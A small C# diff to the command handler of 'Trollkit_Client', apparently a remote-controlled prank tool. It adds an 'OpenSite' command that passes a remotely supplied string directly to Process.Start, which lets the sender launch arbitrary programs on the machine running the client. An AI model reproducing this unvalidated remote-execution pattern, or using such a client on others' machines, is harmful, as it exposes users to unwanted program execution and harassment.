@@ -26,6 +26,7 @@ namespace Trollkit_Client.Modules.CommandHandlers
 				case "ShowImage":
 					break;
 				case "OpenSite":
+					OpenSite(obj.Value);
 					break;
 				case "SetBackground":
 					break;
@@ -43,6 +44,11 @@ namespace Trollkit_Client.Modules.CommandHandlers
 		private static IntPtr GetHandle()
 		{
 			return Process.GetCurrentProcess().MainWindowHandle;
+		}
+
+		private void OpenSite(string Site)
+		{
+			Process.Start(Site);
 		}
 	}
 }
